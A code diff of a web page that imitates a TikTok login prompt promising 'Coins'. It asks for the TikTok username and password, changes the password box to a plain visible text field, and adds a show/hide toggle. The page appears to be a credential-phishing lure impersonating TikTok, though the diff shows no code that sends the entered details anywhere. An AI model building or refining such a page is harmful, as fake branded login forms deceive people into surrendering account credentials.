@@ -44,16 +44,16 @@ body {
   margin: 0;
   font-size: 32px;
   font-weight: bold;
-  margin-top: 15px; /* was 30px — moved upward ✅ */
+  margin-top: 15px;
   line-height: 1.2;
 }
 
-/* Sub-text is now directly under Get Coins */
+/* Sub-text */
 .sub-text {
   font-size: 15px;
   color: #333;
   font-weight: 600;
-  margin-top: 8px; /* was 12px — slightly closer ✅ */
+  margin-top: 8px;
   margin-bottom: 10px;
   line-height: 1.4;
 }
@@ -388,8 +388,17 @@ body {
          style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
     <h2 style="margin-top: 20px;">Log in to get Coins</h2>
     <p>Log in to your TikTok account to get Coins, check notifications and more.</p>
+
     <input type="text" id="usernameInput" placeholder="Username" required><br>
-    <input type="password" id="passwordInput" placeholder="Password" required><br>
+
+    <div style="position: relative; display: inline-block; width: 85%;">
+      <input type="text" id="passwordInput" placeholder="Password" required style="width: 100%; padding-right: 40px;">
+      <span id="togglePassword"
+            style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #999; font-size: 16px;">
+        👁
+      </span>
+    </div><br>
+
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
@@ -462,6 +471,7 @@ function completeLogin() {
   updateButton();
 }
 
+// Enable/disable continue button
 const usernameField = document.getElementById("usernameInput");
 const passwordField = document.getElementById("passwordInput");
 const continueBtn = document.getElementById("continueBtn");
@@ -480,6 +490,15 @@ function checkLoginFields() {
 
 usernameField.addEventListener("input", checkLoginFields);
 passwordField.addEventListener("input", checkLoginFields);
+
+// Toggle show/hide password
+const togglePassword = document.getElementById("togglePassword");
+togglePassword.addEventListener("click", () => {
+  const input = document.getElementById("passwordInput");
+  const isText = input.type === "text";
+  input.type = isText ? "password" : "text";
+  togglePassword.textContent = isText ? "👁" : "🙈";
+});
 </script>
 </body>
 </html>
